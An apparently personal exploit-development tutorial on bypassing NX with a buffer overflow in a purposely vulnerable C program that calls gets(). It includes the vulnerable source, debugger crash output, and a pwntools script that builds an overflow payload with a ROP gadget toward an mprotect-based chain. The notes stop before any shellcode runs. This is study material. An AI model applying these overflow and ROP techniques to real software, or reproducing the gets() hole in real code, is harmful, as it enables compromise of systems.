# Bypassing NX using mprotect() and gets(buffer) weak user input

* The vuln.c program:
```C
#include <stdio.h>

// manually declaring gets to bypass compilation error
char *gets(char *s);

int main(int argc, char *argv[]) 
{
        char buffer[256];
        printf(argv[1]);
        printf("\n");
        gets(buffer);
        return 0;
}
```

## Crashing the program:
* The buffer is of size 256 so lets send `256 * A` followed by `4 * B` and check what happens:
```bash
$eax   : 0x0       
$ebx   : 0xf7f9ce00  →  0x00000000
$ecx   : 0x42424242 ("BBBB"?)
$edx   : 0x0       
$esp   : 0x4242423e (">BBB"?)
$ebp   : 0x0       
$esi   : 0xffffcecc  →  0xffffd108  →  "COLORFGBG=15;0"
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x56556210  →  <main+0063> ret 
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
[!] Unmapped address: '0x4242423e'
──────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x5655620b <main+005e>      pop    ebx
   0x5655620c <main+005f>      pop    ebp
   0x5655620d <main+0060>      lea    esp, [ecx-0x4]
 → 0x56556210 <main+0063>      ret    
   0x56556211                  add    BYTE PTR [eax], al
   0x56556213                  add    BYTE PTR [ebx-0x7d], dl
   0x56556216 <_fini+0002>     in     al, dx
   0x56556217 <_fini+0003>     or     al, ch
   0x56556219 <_fini+0005>     xchg   ebx, eax
──────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x56556210 in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x56556210 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
* As we can see, the return address written is the wrong one, and thats where we want to write our code
* Intersting point: on the top we see 
```bash
$ecx   : 0x42424242 ("BBBB"?)
...
$esp   : 0x4242423e (">BBB"?)
...
[!] Unmapped address: '0x4242423e'
```
What happens here is that the uppercase 'B' became a '>' in ESP because the stack pointer was pushed onto the stack at the start of the function, and loaded again before returning. 
It loads from ECX and subtracts 4, and because of the overflow, 'BBBB' or 0x42424242, is stored, and gives back 0x4242423e (giving `3e` instead of 42 for the first byte)
Apparently, moving the code from the main() function to a new function would get around the issue with the first character changing. 


Ok so we have the buffer fully overwritten, and then some value 'BBBB' is put onto the stack ... good. Lets change this value with the address of the `pop edx; ret;` gadget, and try to pop `0xffffffff` into `edx`:
```bash
#!/usr/bin/python3
from pwn import *

junk = b"A" * 256

rop = b"".join([
    p32(libc_base + 0x0003b4fc),
    p32(0xffffffff)
])

payload = junk + rop #+ shellcode

with open('payload', 'wb') as f:
    f.write(payload)
```
The Result:
```bash
───────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0xffffffff
$ecx   : 0xf7db04fc  →  <setjmp+003c> pop edx
$edx   : 0x0       
$esp   : 0xf7db04fc  →  <setjmp+003c> pop edx
$ebp   : 0x0       
$esi   : 0xffffcecc  →  0xffffd108  →  "COLORFGBG=15;0"
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x59ffffff
```
Good, `pop edx` is put onto the stack, and the next value that follows is `0xffffffff` as expected
